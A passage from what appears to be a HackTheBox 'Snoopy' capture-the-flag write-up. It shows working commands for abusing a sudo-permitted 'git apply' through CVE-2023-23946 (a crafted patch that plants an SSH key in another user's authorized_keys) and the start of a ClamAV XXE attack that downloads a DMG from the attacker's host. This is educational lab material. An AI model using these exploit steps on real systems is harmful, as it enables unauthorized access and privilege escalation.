+2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 10.10.11.212:33012 (172.17.0.2:2222) [session: 1686340e31d0]
+2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Remote SSH version: SSH-2.0-paramiko_3.1.0
+2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] SSH client hassh fingerprint: a704be057881f0b1d623cd263e477a8b
+2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-ed25519'
+2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2023-05-10T01:54:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' trying auth b'password'
+2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Could not read etc/userdb.txt, default database activated
+2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed
+2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' failed auth b'password'
+2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+</span></code></pre></div></div>
+<p>The third to last line has the username cbrown and the password “sn00pedcr3dential!!!”.</p>
+<h4 id="shell-as-cbrown-1">Shell as cbrown</h4>
+<p>With those creds, I can SSH into Snoopy as cbrown:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'sn00pedcr3dential!!!'</span> ssh cbrown@snoopy.htb
+<span class="go">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+...[snip]...
+</span><span class="gp">cbrown@snoopy:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-sbrown">Shell as sbrown</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-dirs">Home Dirs</h4>
+<p>cbrown’s home directory is empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 28
+drwxr-x--- 4 cbrown cbrown 4096 Apr 25 11:47 .
+drwxr-xr-x 4 root   root   4096 Mar 19 04:54 ..
+lrwxrwxrwx 1 root   root      9 Mar 26 00:52 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 cbrown cbrown  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 cbrown cbrown 3771 Jan  6  2022 .bashrc
+drwx------ 2 cbrown cbrown 4096 Feb 24 06:04 .cache
+-rw-r--r-- 1 cbrown cbrown  807 Jan  6  2022 .profile
+drwx------ 2 cbrown cbrown 4096 Feb 24 06:04 .ssh
+lrwxrwxrwx 1 root   root      9 Mar 26 00:52 .viminfo -&gt; /dev/null
+</span></code></pre></div></div>
+<p>There’s one other home directory, sbrown, and cbrown can’t access it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">cbrown  sbrown
+</span><span class="gp">cbrown@snoopy:/home$</span><span class="w"> </span><span class="nb">ls </span>sbrown/
+<span class="go">ls: cannot open directory 'sbrown/': Permission denied
+</span></code></pre></div></div>
+<h4 id="git">Git</h4>
+<p>cbrown can run <code class="language-plaintext highlighter-rouge">git apply -v</code> on a single argument as sbrown:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for cbrown: 
+Matching Defaults entries for cbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User cbrown may run the following commands on snoopy:
+</span><span class="gp">    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$</span><span class="w">
+</span></code></pre></div></div>
+<p>The regex doesn’t allow spaces or the characters needed to simulate a space in Bash, so it has to be one repo argument to apply.</p>
+<p>A Git repo always has a folder named <code class="language-plaintext highlighter-rouge">.git</code> at the root of the project. Weirdly, there are no repos on this box that cbrown can see:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-name</span> .git 2&gt;/dev/null
+<span class="gp">cbrown@snoopy:/$</span><span class="w">
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git</code> is installed on Snoopy, and it’s version is 2.34.1:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/$</span><span class="w"> </span>dpkg <span class="nt">-l</span> | <span class="nb">grep</span> <span class="s1">' git '</span>
+<span class="go">hi  git                                   1:2.34.1-1ubuntu1.6                     amd64        fast, scalable, distributed revision control system
+</span></code></pre></div></div>
+<h3 id="cve-2023-23946">CVE-2023-23946</h3>
+<h4 id="identify-1">Identify</h4>
+<p>Searching for “git apply exploit” leads to a <a href="https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/">blog post</a> from GitHub, and several posts on a path traversal vulnerability, CVE-2023-23946:</p>
+<picture>
+<source srcset="/img/image-20230510091703886.webp" type="image/webp"/>
+<img alt="image-20230510091703886" class="include_image" loading="lazy" src="/img/image-20230510091703886.png"/>
+</picture>
+<p><a href="https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh">This page</a> shows the versions that are vulnerable to CVE-2023-23946:</p>
+<picture>
+<source srcset="/img/image-20230510092440169.webp" type="image/webp"/>
+<img alt="image-20230510092440169" class="include_image" loading="lazy" src="/img/image-20230510092440169.png"/>
+</picture>
+<p>2.34.1 should be vulnerable.</p>
+<h4 id="background">Background</h4>
+<p>The <a href="https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/">GitHub post</a> has a nice summary of the vulnerability:</p>
+<blockquote>
+<p>Git allows for applying arbitrary patches to your repository’s history with <code class="language-plaintext highlighter-rouge">git apply</code>. In order to prevent malicious patches from creating files outside of the working copy, <code class="language-plaintext highlighter-rouge">git apply</code> rejects patches which attempt to write a file beyond a symbolic link.</p>
+<p>However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victim’s filesystem when applying malicious patches from untrusted sources.</p>
+</blockquote>
+<p>Like it says, <code class="language-plaintext highlighter-rouge">git apply</code> is about applying “patches” to a repo. Patches are files that show changes between two versions, and look like the output of a <code class="language-plaintext highlighter-rouge">git diff</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>diff --git a/file1.txt b/file1.txt
+index 1234567..89abcdef 100644
+--- a/file1.txt
++++ b/file1.txt
+@@ -1,2 +1,2 @@
+-This is the old text.
++This is the new text.
+ 
+-It has been changed.
++It has been updated.
+</code></pre></div></div>
+<p>The vulnerability here is that if the symbolic link is created by the diff, it can still edit outside the repo, giving arbitrary write.</p>
+<p>I recently showed how git could add a file that isn’t in the repo in <a href="/2023/04/15/htb-encoding.html#execution">Encoding</a>. This would skip the need for the link. Unfortunately for me, Git tries to block applying a patch outside of the repository itself. There are ways around this (I’ll show one in <a href="#cbrown--sbrown-unsafe-paths">Beyond Root</a>), but with the regex-limited <code class="language-plaintext highlighter-rouge">sudo</code>, I don’t know a way.</p>
+<h4 id="patch-analysis">Patch Analysis</h4>
+<p>At the time of release of Snoopy, there aren’t any public POCs for CVE-2023-23946. I’ll have to figure out how to exploit this.</p>
+<p>The source code for Git is on <a href="https://github.com/git/git">GitHub</a>. The <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23946">Nist</a> and <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23946">Mitre</a> pages for the CVE have links to <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd">this commit</a>. <code class="language-plaintext highlighter-rouge">apply.c</code> has <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-8273385c4a17d688bbbd5f8297c84241a174c6e6aea289370b57294fd988eaa6">the fix</a>, which is 24 lines of comment and two lines of error check:</p>
+<picture>
+<source srcset="/img/image-20230510113951341.webp" type="image/webp"/>
+<img alt="image-20230510113951341" class="include_image" loading="lazy" src="/img/image-20230510113951341.png"/>
+</picture>
+<p>Further down, there’s a change to <code class="language-plaintext highlighter-rouge">t/t4115-apply-symlink.sh</code> (<a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-d37fceb39eb9394533430ff8956cad41dd7f9233672dc778fd5690625906069f">on GitHub</a>). In this file, it adds tests that should now fail!</p>
+<picture>
+<source srcset="/img/image-20230510122051917.webp" type="image/webp"/>
+<img alt="image-20230510122051917" class="include_image" loading="lazy" src="/img/image-20230510122051917.png"/>
+</picture>
+<p>There’s tests for creating, modifying, and deleting files. This is basically a POC.</p>
+<h4 id="poc">POC</h4>
+<p>Before I start working with <code class="language-plaintext highlighter-rouge">git</code>, I’ll need to set some global variables to keep <code class="language-plaintext highlighter-rouge">git</code> from yelling at me:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span>git config <span class="nt">--global</span> user.name <span class="s2">"cbrown"</span>
+<span class="gp">cbrown@snoopy:~$</span><span class="w"> </span>git config <span class="nt">--global</span> user.email <span class="s2">"cbrown@snoopy.htb"</span>
+<span class="gp">cbrown@snoopy:~$</span><span class="w"> </span>git config <span class="nt">--global</span> init.defaultBranch main
+</code></pre></div></div>
+<p>Now I’ll create a directory in <code class="language-plaintext highlighter-rouge">/dev/shm</code> and make it a Git repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">mkdir</span> /dev/shm/poc
+<span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">cd</span> /dev/shm/poc
+<span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span>git init
+<span class="go">Initialized empty Git repository in /dev/shm/poc/.git/
+</span></code></pre></div></div>
+<p>To test, I’m going to try to create a file in a directory I own (without using <code class="language-plaintext highlighter-rouge">sudo</code>) to make troubleshooting easier. I’ll create <code class="language-plaintext highlighter-rouge">/home/cbrown/0xdf</code>. First I need to create a symlink that points to target directory and add it to the repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /home/cbrown/ symlink
+<span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span>git add symlink
+<span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span>git commit <span class="nt">-m</span> <span class="s2">"add symlink"</span>
+<span class="go">[main (root-commit) 6eba49c] add symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 symlink
+</span></code></pre></div></div>
+<p>I’ll create the <code class="language-plaintext highlighter-rouge">patch</code> file, using the data from the test, modifying it slightly:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>diff --git a/symlink b/renamed-symlink
+similarity index 100%
+rename from symlink
+rename to renamed-symlink
+--
+diff --git /dev/null b/renamed-symlink/0xdf
+new file mode 100644
+index 0000000..039727e
+--- /dev/null
++++ b/renamed-symlink/0xdf
+@@ -0,0 +1,1 @@
++busted
+</code></pre></div></div>
+<p>The only change is from <code class="language-plaintext highlighter-rouge">create-me</code> to <code class="language-plaintext highlighter-rouge">0xdf</code> in two places. <code class="language-plaintext highlighter-rouge">git apply patch</code> will run it, and the new file exists:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span>git apply patch
+<span class="gp">cbrown@snoopy:/dev/shm/poc$</span><span class="w"> </span><span class="nb">cat</span> ~/0xdf 
+<span class="go">busted
+</span></code></pre></div></div>
+<h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
+<p>With <code class="language-plaintext highlighter-rouge">sudo</code>, I can do this exploit as sbrown. The first thing I’ll try is overwriting their <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. I’ll start a brand new repo, this time adding a symlink pointing to sbrown’s <code class="language-plaintext highlighter-rouge">.ssh</code> folder:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm$</span><span class="w"> </span><span class="nb">mkdir </span>ssh
+<span class="gp">cbrown@snoopy:/dev/shm$</span><span class="w"> </span><span class="nb">cd </span>ssh/
+<span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span>git init
+<span class="go">Initialized empty Git repository in /dev/shm/ssh/.git/
+</span><span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /home/sbrown/.ssh symlink
+<span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span>git add symlink 
+<span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span>git commit <span class="nt">-m</span> <span class="s2">"add symlink"</span>
+<span class="go">[main (root-commit) 4f69273] add symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 symlink
+</span></code></pre></div></div>
+<p>I’ll create a <code class="language-plaintext highlighter-rouge">patch</code> file again, this time changing <code class="language-plaintext highlighter-rouge">0xdf</code> to <code class="language-plaintext highlighter-rouge">authorized_keys</code>, and <code class="language-plaintext highlighter-rouge">busted</code> to an SSH public key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">diff --git a/symlink b/renamed-symlink
+similarity index 100%
+rename from symlink
+rename to renamed-symlink
+</span><span class="diff-removed">--
+</span><span class="go">diff --git /dev/null b/renamed-symlink/authorized_keys
+new file mode 100644
+index 0000000..039727e
+</span><span class="diff-removed">--- /dev/null
+</span><span class="diff-added">+++ b/renamed-symlink/authorized_keys
+</span><span class="diff-lines">@@ -0,0 +1,1 @@
+</span><span class="diff-added">+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
+</span></code></pre></div></div>
+<p>When I run this, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> sbrown git apply <span class="nt">-v</span> patch
+<span class="go">[sudo] password for cbrown: 
+warning: unable to unlink 'symlink': Permission denied
+error: unable to write file 'renamed-symlink' mode 120000: No such file or directory
+</span></code></pre></div></div>
+<p>The  <code class="language-plaintext highlighter-rouge">warning</code> is important to notice here. It’s trying to “unlink” <code class="language-plaintext highlighter-rouge">symlink</code> and failing. That’s because sbrown doesn’t have permissions to. The directory is owned by cbrown, and all users can’t write to it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 0
+drwxrwxr-x 3 cbrown cbrown 100 May 10 16:27 poc
+drwxrwxr-x 3 cbrown cbrown 100 May 10 16:32 ssh
+</span></code></pre></div></div>
+<p>If I change the permissions on the dir such that all users can write, it works without error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/dev/shm$</span><span class="w"> </span><span class="nb">chmod </span>777 ssh/
+<span class="gp">cbrown@snoopy:/dev/shm$</span><span class="w"> </span><span class="nb">cd </span>ssh/
+<span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> sbrown git apply patch
+<span class="gp">cbrown@snoopy:/dev/shm/ssh$</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="ssh-1">SSH</h3>
+<p>With my key in place, I can SSH into the box as sbrown:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen sbrown@snoopy.htb
+<span class="go">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+...[snip]...
+</span><span class="gp">sbrown@snoopy:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And get <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">f1790bcd************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>sbrown can run <code class="language-plaintext highlighter-rouge">clamscan</code> in a specific way as root using <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for sbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User sbrown may run the following commands on snoopy:
+</span><span class="gp">    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$</span><span class="w">
+</span></code></pre></div></div>
+<p>This is actually one of the first time I’ve seen regex used in a <code class="language-plaintext highlighter-rouge">sudo</code> rule like this, which <a href="https://www.sudo.ws/posts/2022/03/sudo-1.9.10-using-regular-expressions-in-the-sudoers-file/">was added</a> in version 1.9.10 in March 2022.</p>
+<h3 id="identify-cve-2023-20052">Identify CVE-2023-20052</h3>
+<p>Searching for “clamav vulnerability” will turn up many articles from February 2023 about CVE-2023-20032 and CVE-2023-20052:</p>
+<picture>
+<source srcset="/img/image-20230510132938408.webp" type="image/webp"/>
+<img alt="image-20230510132938408" class="include_image" loading="lazy" src="/img/image-20230510132938408.png"/>
+</picture>
+<p>CVE-2023-20032 is an issue with how HFS+ partition files are handled by the scanner:</p>
+<blockquote>
+<p>This vulnerability is due to a missing buffer size check that may result in a heap buffer overflow write. An attacker could exploit this vulnerability by submitting a crafted HFS+ partition file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to execute arbitrary code with the privileges of the ClamAV scanning process, or else crash the process, resulting in a denial of service (DoS) condition.</p>
+</blockquote>
+<p>I’m not able to find any POCs for this, and exploiting it seems very difficult to craft, probably too hard for even a hard box on HackTheBox.</p>
+<p>CVE-2023-20052 is an XXE attack in how clamav parses DMG files.</p>
+<p>ClamAV on Snoopy is 1.0.0, so these vulnerabilities should apply:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span>dpkg <span class="nt">-l</span>| <span class="nb">grep </span>clam
+<span class="go">hi  clamav                                1.0.0-1                                 amd64        ClamAV open source email, web, and end-point anti-virus toolkit.
+</span></code></pre></div></div>
+<h3 id="manual-exploitation">Manual Exploitation</h3>
+<h4 id="strategy">Strategy</h4>
+<p>Writing this only a few days after Snoopy’s release, there’s almost no technical details about the CVE. I’m going to take the strategy of:</p>
+<ul>
+<li>making or finding a  <code class="language-plaintext highlighter-rouge">.dmg</code> file;</li>
+<li>understanding the XML in that file;</li>
+<li>running that <code class="language-plaintext highlighter-rouge">.dmg</code> file through ClamAV and looking for potential output;</li>
+<li>modifying the <code class="language-plaintext highlighter-rouge">.dmg</code> file to contain an XXE payload.</li>
+</ul>
+<p>[add part here about showing easy way at the end or in BR]</p>
+<h4 id="get-dmg">Get DMG</h4>
+<p>A DMG is a proprietary disk image format used primarily on macOS. It is a type of file that acts as a container for other files and folders, and is commonly used for distributing software, applications, and other files. It’s similar to an ISO file.</p>
+<p>I’ll read about how to create a DMG file, but on Linux it’s not trivial (at least during the initial release week). Instead, I’ll opt to find a DMG file on the internet.</p>
+<p>Some googling finds <a href="https://macdownload.informer.com/notepad/download/">this one</a>, a notepad application. I’ll download it.</p>
+<h4 id="identify-xml">Identify XML</h4>
+<p>The XML in a <code class="language-plaintext highlighter-rouge">.dmg</code> is the Apple plist file, a file format used by Apple’s macOS and iOS operating systems to store configuration and preference data. Running <code class="language-plaintext highlighter-rouge">strings</code> on the file finds the XML:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>strings notepad.dmg
+<span class="go">...[snip]...
+D&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+...[snip]...
+</span></code></pre></div></div>
+<p>The full XML looks like:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
+<span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;dict&gt;</span>
+        <span class="nt">&lt;key&gt;</span>resource-fork<span class="nt">&lt;/key&gt;</span>
+        <span class="nt">&lt;dict&gt;</span>
+                <span class="nt">&lt;key&gt;</span>blkx<span class="nt">&lt;/key&gt;</span>
+                <span class="nt">&lt;array&gt;</span>
+                        <span class="nt">&lt;dict&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Attributes<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0x0050<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>CFName<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>Driver Descriptor Map (DDM : 0)<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Data<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;data&gt;</span>...[snip]...<span class="nt">&lt;/data&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>ID<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>-1<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>Driver Descriptor Map (DDM : 0)<span class="nt">&lt;/string&gt;</span>
+                        <span class="nt">&lt;/dict&gt;</span>
+                        <span class="nt">&lt;dict&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Attributes<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0x0050<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>CFName<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>Apple (Apple_partition_map : 1)<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Data<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;data&gt;</span>...[snip]...<span class="nt">&lt;/data&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>ID<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>Apple (Apple_partition_map : 1)<span class="nt">&lt;/string&gt;</span>
+                        <span class="nt">&lt;/dict&gt;</span>
+                        <span class="nt">&lt;dict&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Attributes<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0x0050<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>CFName<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>disk image (Apple_HFS : 2)<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Data<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;data&gt;</span>...[snip]...<span class="nt">&lt;/data&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>ID<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>1<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>disk image (Apple_HFS : 2)<span class="nt">&lt;/string&gt;</span>
+                        <span class="nt">&lt;/dict&gt;</span>
+                        <span class="nt">&lt;dict&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Attributes<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0x0050<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>CFName<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span> (Apple_Free : 3)<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Data<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;data&gt;</span>...[snip]...<span class="nt">&lt;/data&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>ID<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>2<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span> (Apple_Free : 3)<span class="nt">&lt;/string&gt;</span>
+                        <span class="nt">&lt;/dict&gt;</span>
+                <span class="nt">&lt;/array&gt;</span>
+                <span class="nt">&lt;key&gt;</span>plst<span class="nt">&lt;/key&gt;</span>
+                <span class="nt">&lt;array&gt;</span>
+                        <span class="nt">&lt;dict&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Attributes<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0x0050<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Data<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;data&gt;</span>...[snip]...<span class="nt">&lt;/data&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>ID<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;</span>0<span class="nt">&lt;/string&gt;</span>
+                                <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
+                                <span class="nt">&lt;string&gt;&lt;/string&gt;</span>
+                        <span class="nt">&lt;/dict&gt;</span>
+                <span class="nt">&lt;/array&gt;</span>
+        <span class="nt">&lt;/dict&gt;</span>
+<span class="nt">&lt;/dict&gt;</span>
+<span class="nt">&lt;/plist&gt;</span>
+                           
+</code></pre></div></div>
+<p>That’s very long. I’ll note two <code class="language-plaintext highlighter-rouge">key</code> values, <code class="language-plaintext highlighter-rouge">blkx</code> and <code class="language-plaintext highlighter-rouge">plist</code>, each having an <code class="language-plaintext highlighter-rouge">&lt;array&gt;</code> with a <code class="language-plaintext highlighter-rouge">&lt;dict&gt;</code> inside..</p>
+<h4 id="upload-and-scan">Upload and Scan</h4>
+<p>I’ll upload this file into the <code class="language-plaintext highlighter-rouge">scanfiles</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~/scanfiles$</span><span class="w"> </span>wget 10.10.14.6/notepad.dmg
+<span class="go">--2023-05-10 20:47:58--  http://10.10.14.6/notepad.dmg
+Connecting to 10.10.14.6:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10471167 (10.0M) [application/x-apple-diskimage]
+Saving to: ‘notepad.dmg’
+
+notepad.dmg                                          100%[==============&gt;]   9.99M  8.53MB/s    in 1.2s    
+
+2023-05-10 20:47:59 (8.53 MB/s) - ‘notepad.dmg’ saved [10471167/10471167]
+</span></code></pre></div></div>
